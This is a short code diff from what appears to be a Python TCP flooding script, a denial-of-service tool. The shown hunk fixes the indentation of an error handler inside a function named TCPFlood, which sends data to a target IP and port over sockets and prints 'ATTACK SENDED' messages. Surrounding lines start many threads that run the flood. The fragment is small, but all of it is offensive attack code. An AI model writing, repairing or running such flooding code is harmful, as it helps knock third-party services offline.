@@ -30,8 +30,8 @@ def TCPFlood():
              tcp_socket.sendall(avi)
              print(f"ATTACK SENDED TO {ip}:{port}")
       except socket.error:
-      print(f"ATTACK SENDED TO {ip}:{port}")
-      tcp_socket.close()
+             print(f"ATTACK SENDED TO {ip}:{port}")
+             tcp_socket.close()
       
 for y in range(thread):
     th = threading.Thread(target=TCPFlood)
